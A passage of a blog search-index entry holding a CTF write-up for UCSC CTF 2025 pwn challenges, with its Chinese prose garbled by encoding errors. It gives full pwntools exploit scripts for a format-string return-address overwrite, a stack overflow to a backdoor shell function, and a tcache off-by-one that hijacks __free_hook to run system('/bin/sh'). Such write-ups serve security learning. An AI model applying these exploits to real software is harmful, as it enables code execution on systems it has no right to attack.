·æˆ‘ä»¬å°±å¾—åˆ°äº†è¿”å›åœ°å€</p><p>ç¬¬äºŒæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å…ˆæŠŠè¿”å›åœ°å€å†™å…¥æ ˆä¸Šï¼Œç´§æ¥ç€å¯¹å®ƒè¿›è¡Œä¿®æ”¹ï¼Œå°†å…¶æŒ‡å‘shellï¼ˆï¼‰åé—¨å‡½æ•°</p><p><img src="/../WP/UCSC2025/13.png" alt="image-20250423185521207"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ€åˆçš„è¿”å›åœ°å€æŒ‡å‘çš„æ˜¯0x4154bè¿™ä¸ªåœ°å€</p><p><img src="/../WP/UCSC2025/14.png" alt="image-20250423185607974"></p><p>æˆ‘ä»¬éœ€è¦å°†å®ƒæ”¹å†™ä¸º0x401265è¿™ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯éœ€è¦æ”¹å†™ä¸¤ä¸ªå­—èŠ‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br></pre></td></tr></table></figure><p><img src="/../WP/UCSC2025/15.png" alt="image-20250423190714979"></p><p>å¯ä»¥çœ‹åˆ°è¿”å›åœ°å€å·²ç»è¢«æˆåŠŸæ”¹å†™</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">retn = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) + <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;retn  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(retn))                  </span><br><span class="line">fmt()</span><br><span class="line">payload2 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x1265</span>).encode() + <span class="string">b&#x27;c%8$hnaaaaa&#x27;</span> + p64(retn)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h4><p>è§£æ³•äºŒç›¸å¯¹äºè§£æ³•ä¸€æ¥è¯´ ç¡®å®è¾ƒä¸ºç®€å• </p><p><img src="/../WP/UCSC2025/16.png" alt="image-20250423195504888"></p><p>å·²çŸ¥userï¼ˆï¼‰å‡½æ•°ä¸­å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç»è¿‡æµ‹è¯•å‘ç°rootç”¨æˆ·çš„å¯†ç æ­£æ˜¯ä¸Šå›¾çº¢æ¡†çš„ä½ç½®ï¼Œ</p><p>åªè¦é€šè¿‡å­—æ ¼æ³„éœ²å‡ºrootçš„å¯†ç ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿›å…¥rootï¼ˆï¼‰å‡½æ•°</p><p>rootï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/17.png" alt="image-20250423195504889"></p><p>rootï¼ˆï¼‰å‡½æ•°å…·æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œç”±äºæˆ‘ä»¬å·²ç»çŸ¥é“äº†shellçš„åœ°å€ï¼Œæ‰€ä»¥è¿™é¢˜å¯ä»¥é€šè¿‡rootï¼ˆï¼‰å‡½æ•°ï¼Œæ ˆæº¢å‡ºç›´æ¥åŠ«æŒè¿”å›åœ°å€æŒ‡å‘shellå‡½æ•°</p><h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;supersecureuser&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Write Something\n&quot;</span>)</span><br><span class="line">fmt()</span><br><span class="line">shell = <span class="number">0x401265</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$s&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">password = p.recvuntil(<span class="string">&quot;Password:&quot;</span>)[:-<span class="number">9</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password  &gt;&gt; &quot;</span> + <span class="built_in">str</span>(password))</span><br><span class="line">p.sendline(password)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Note: \n&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ç–¯ç‹‚å¤åˆ¶"><a href="#ç–¯ç‹‚å¤åˆ¶" class="headerlink" title="ç–¯ç‹‚å¤åˆ¶"></a>ç–¯ç‹‚å¤åˆ¶</h3><p><strong>LIBCï¼š2.27-3ubuntu1_amd64</strong></p><p>ï¼ˆæœ¬é¢˜ç›®è§£æ³•æ¯”è¾ƒå¤šï¼Œåç»­ä¼šçœ‹æƒ…å†µæ›´æ–°æ›´å¤šçš„è§£æ³•ï¼‰</p><p><img src="/../WP/UCSC2025/18.png" alt="image-20250424114730714"></p><p>å¸¸è§„æ£€æŸ¥ï¼š64ä½ RELRO NX PIE</p><p>IDA:</p><p>mainï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/19.png" alt="image-20250424115140346"></p><p>  <u>****<strong>å¾ˆç»å…¸çš„èœå•å †é¢˜ï¼Œå¢åˆ æŸ¥æ”¹å››æ ·ä¿±å…¨</strong></u></p><p>delï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/20.png" alt="image-20250424115351043"></p><p>freeåå°†æŒ‡é’ˆç½®ç©ºï¼Œæ•…ä¸å­˜åœ¨UAFæˆ–è€…double freeæ¼æ´</p><p>editï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/21.png" alt="image-20250424115540363"></p><p>setinputï¼ˆï¼‰å‡½æ•°ï¼š</p><p><img src="/../WP/UCSC2025/22.png" alt="image-20250424115631440"></p><p>æŸ¥çœ‹editï¼ˆï¼‰å‡½æ•° ï¼Œåˆæ­¥æ€€ç–‘å­˜åœ¨off by oneæ¼æ´</p><p><img src="/../WP/UCSC2025/23.png" alt="image-20250424115906819"></p><p>æœ¬åœ°äº¤äº’è¯æ˜çŒœæƒ³æ­£ç¡®ï¼Œsizeå¤§å°ä¸º8ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å´å¯ä»¥ç¼–è¾‘è¾“å…¥9ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåˆ©ç”¨è¿™å¤šå‡ºæ¥çš„ä¸€ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥åšå¾ˆå¤šäº‹æƒ…</p><h4 id="è§£æ³•ä¸€-ï¼ˆoff-by-oneï¼‰ï¼š"><a href="#è§£æ³•ä¸€-ï¼ˆoff-by-oneï¼‰ï¼š" class="headerlink" title="è§£æ³•ä¸€ ï¼ˆoff by oneï¼‰ï¼š"></a>è§£æ³•ä¸€ ï¼ˆoff by oneï¼‰ï¼š</h4><h5 id="åšé¢˜æ€è·¯ï¼š-2"><a href="#åšé¢˜æ€è·¯ï¼š-2" class="headerlink" title="åšé¢˜æ€è·¯ï¼š"></a>åšé¢˜æ€è·¯ï¼š</h5><ol><li>å…ˆåˆ©ç”¨ unsortedbin leak æ³„éœ²å‡º libcåŸºåœ°å€</li><li>å†é€šè¿‡ off by one ç›´æ¥ä¿®æ”¹__free_hookä¸ºsystemçš„åœ°å€</li><li>æœ€åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º &#x2F;bin&#x2F;sh\x00 çš„å †å— ä»è€Œgetshell</li></ol><p><strong>Part1: æ³„éœ²LIBC</strong></p><hr><p>ç”±äºé¢˜ç›®libcç‰ˆæœ¬æ˜¯2.27-3ubuntu1_amd64ï¼Œglibcåœ¨2.26ç‰ˆæœ¬å¼•å…¥äº†ä¸€ä¸ªæ–°çš„å †å†…å­˜ç®¡ç†æœºåˆ¶â€”-TcacheBinï¼Œæ—¨åœ¨åŠ é€Ÿå°å—å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ã€‚</p><h5 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h5><ol><li><p>TcacheBinç®¡ç†çš„å†…å­˜å—å¤§å°èŒƒå›´ä¸º 0x18 - 0x408</p></li><li><p>æ¯ä¸ªç›¸åŒå¤§å°çš„TcacheBinæœ€å¤šå­˜å‚¨ 7 ä¸ªchunk</p></li><li><p>å¦‚æœç›¸åŒå¤§å°çš„TcacheBinæ²¡æœ‰å æ»¡7ä¸ªchunkï¼Œfreeæ‰å¯¹åº”å¤§å°çš„å †å—åä¼šä¼˜å…ˆè¿›å…¥TcacheBin è€Œä¸æ˜¯ fastbin æˆ–è€…æ˜¯ unsortedbin</p><hr><p>ç”±äºTcacheBinçš„å¼•å…¥ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨unsortedbin leakï¼Œå› ä¸ºé‡Šæ”¾çš„å †å—ä¼šä¼˜å…ˆè¿›å…¥tcachebinï¼Œä½†æ˜¯ç”±äºtcachebinå­˜å‚¨çš„chunkæ•°é‡æœ‰é™åˆ¶ï¼Œåªè¦æˆ‘ä»¬æŠŠ7ä¸ªä½ç½®å…¨éƒ¨å æ»¡ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é‡Šæ”¾å¯¹åº”å¤§å°çš„å †å—ï¼Œä»è€Œè¿›å…¥unsortedbinã€‚</p><p><img src="/../WP/UCSC2025/24.png" alt="image-20250424132206434"></p><p>å…ˆåˆ›é€ 9ä¸ª0x90çš„å †å—ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé‡Šæ”¾å‰ä¸ƒä¸ªå †å—ï¼Œå æ»¡tcachebinï¼Œç„¶åé‡Šæ”¾ç¬¬8ä¸ªå †å—ï¼Œä½¿å…¶è¿›å…¥unsortedbinï¼Œç¬¬ä¹ä¸ªå †å—çš„ä½œç”¨æ˜¯éš”ç»topchunkï¼Œé˜²æ­¢freeæ‰çš„unsortedbinä¸topchunkè¿›è¡Œåˆå¹¶ã€‚</p><p><img src="/../WP/UCSC2025/25.png" alt="image-20250424132650387"></p></li></ol><p>å¯ä»¥çœ‹åˆ°chunk8å·²ç»è¿›å…¥äº†unsortedbinå½“ä¸­ï¼Œç´§æ¥ç€æˆ‘ä»¬éœ€è¦å¢æ·»ä¸€ä¸ªchunk_sizeä¸º0x40å¤§å°çš„å †å—10ï¼ˆå…¶å®chunk_sizeåœ¨0x90ä»¥å†…éƒ½å¯ä»¥ï¼‰ï¼Œè¿™ä¸ªå †å—æ˜¯ç”±unsortedbinåˆ†é…çš„ï¼Œä¹‹æ‰€ä»¥è¦å¢æ·»ä¸€ä¸ª0x40å¤§å°çš„chunk10ï¼Œè€Œä¸æ˜¯å¢æ·»ä¸€ä¸ª0x90å¤§å°çš„chunk10ï¼Œæ˜¯å› ä¸ºTcacheBinå¦‚æœå¤§å°åŒ¹é…ï¼Œä¼šä¼˜å…ˆä»TcacheBinä¸­åˆ†é…å †å—ï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±æ— æ³•åˆ©ç”¨unsortedbin leakäº†ï¼ˆä¸äº†è§£unsortedbin leakçš„ï¼Œå¯ä»¥å…ˆå»æŸ¥é˜…ç›¸å…³èµ„æ–™ï¼‰</p><p><img src="/../WP/UCSC2025/26.png" alt="image-20250424134108511"></p><p>åˆ©ç”¨showï¼ˆï¼‰å‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°chunk10ä¸­çš„å†…å®¹ï¼Œè®¡ç®—ä¸libcåŸºåœ°å€çš„åç§»ï¼Œç„¶åç”¨æ³„éœ²å‡ºæ¥çš„æŒ‡é’ˆå‡å»åç§»ï¼Œæˆ‘ä»¬å°±å¾—åˆ°äº†libcåŸºåœ°å€</p><p>ä¸è¿‡åœ¨è¿›è¡Œä¸‹ä¸€æ­¥ä¹‹å‰ï¼Œè®°å¾—å…ˆæŠŠunsortedbinä¸­å‰©ä¸‹çš„0x50å¤§å°çš„chunkç”³è¯·å›æ¥ï¼Œä»¥å…é€ æˆå¹²æ‰°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x30</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) -  <span class="number">0x3ebd20</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base  &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p><strong>Part2 : off by one ä¿®æ”¹__free_hook</strong> </p><p>è™½ç„¶tcachebinä¸æ˜¯ä¹‹å‰ç†Ÿæ‚‰çš„ fastbinï¼Œä½†æ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨ off by one æ¼æ´ â€”â€” æ–°çš„å †å†…å­˜ç®¡ç†æœºåˆ¶è™½ç„¶æé«˜äº†æ€§èƒ½ï¼Œä½†ä¹Ÿå‡ä½äº†å®‰å…¨æ€§ï¼Œtcacheçš„æ£€æŸ¥æœºåˆ¶ç›¸å¯¹ä¸fastbinç”šè‡³è¿˜æœ‰æ‰€å‡å°‘</p><p><img src="/../WP/UCSC2025/27.png" alt="image-20250424134539382"></p><p>å…ˆåˆ›é€ ä¸‰ä¸ª0x40å¤§å°çš„chunkï¼Œåˆ†åˆ«æ˜¯ chunk11ã€chunk12 ä»¥åŠ chunk13</p><p><img src="/../WP/UCSC2025/29.png" alt="image-20250424134700582"></p><p>æŸ¥çœ‹chunk11çš„å†…å­˜åˆ†å¸ƒï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨å¤šæº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚ä¿®æ”¹chunk12å †å—çš„å¤§å°ä¸º0x71ï¼Œç„¶åfreeæ‰chunk12ï¼Œé€ æˆchunk12ä¸chunk13çš„å †å—é‡å ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹åˆ©ç”¨chunk12æ¥ä¿®æ”¹chunk13çš„å†…å®¹ï¼Œå…¶ä½œç”¨ç­‰åŒäºUAFæ¼æ´</p><p><img src="/../WP/UCSC2025/28.png" alt="image-20250424140455138"></p><p>å¯ä»¥çœ‹åˆ°åŸæœ¬chunk13çš„ä½ç½®ï¼Œchunk13çš„fdæŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬æ”¹å†™æˆäº†free_hookçš„åœ°å€ï¼ŒæŒ‡å‘äº†free_hook,æ‰€ä»¥åªè¦åœ¨ç”³è¯·ä¸¤ä¸ªå †å—ï¼Œåˆ†åˆ«æ˜¯chunk14å’Œchunk15ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠfree_hookç”³è¯·å‡ºæ¥ï¼ˆchunk15å¯¹åº”çš„æ˜¯free_hook),æˆ‘ä»¬æŠŠchunk14çš„å†…å®¹ä¿®æ”¹æˆ&#x2F;bin&#x2F;sh\x00ï¼ŒæŠŠchunk15çš„å†…å®¹ä¿®æ”¹æˆsystem_addr,è¿™æ ·æˆ‘ä»¬åªè¦æ‰§è¡Œfree(14),å°±ç›¸å½“äºæ‰§è¡Œäº†system(â€˜&#x2F;bin&#x2F;sh\x00â€™)</p><h5 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">def add(index,size):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Size &quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;: &quot;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">#--------------------------------------------------------------------------#</span><br><span class="line">#part1</span><br><span class="line">for i in range(9):</span><br><span class="line">    add(i,0x80)</span><br><span class="line">for i in range(8):</span><br><span class="line">    free(i)</span><br><span class="line">free(7)</span><br><span class="line">add(9,0x30)</span><br><span class="line">show(9)</span><br><span class="line">p.recvuntil(&quot;Content: &quot;)</span><br><span class="line">libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) -  0x3ebd20</span><br><span class="line">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">print(&quot;libc_base  &gt;&gt; &quot; + hex(libc_base))</span><br><span class="line">add(10,0x40)</span><br><span class="line">#part2</span><br><span class="line">add(11,0x38)</span><br><span class="line">add(12,0x38)</span><br><span class="line">add(13,0x38)</span><br><span class="line">payload = b&#x27;a&#x27;*0x38 + p8(0x71)</span><br><span class="line">edit(11,payload)</span><br><span class="line">free(12)</span><br><span class="line">free(13)</span><br><span class="line">add(12,0x68)</span><br><span class="line">payload2 = b&#x27;a&#x27;*0x38 + p64(0x41) + p64(free_hook)</span><br><span class="line">edit(12,payload2)</span><br><span class="line">add(14,0x38)</span><br><span class="line">add(15,0x38)</span><br><span class="line">edit(14,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">edit(15,p64(system_addr))</span><br><span class="line">free(14)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UCSC CTF 2025 WP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
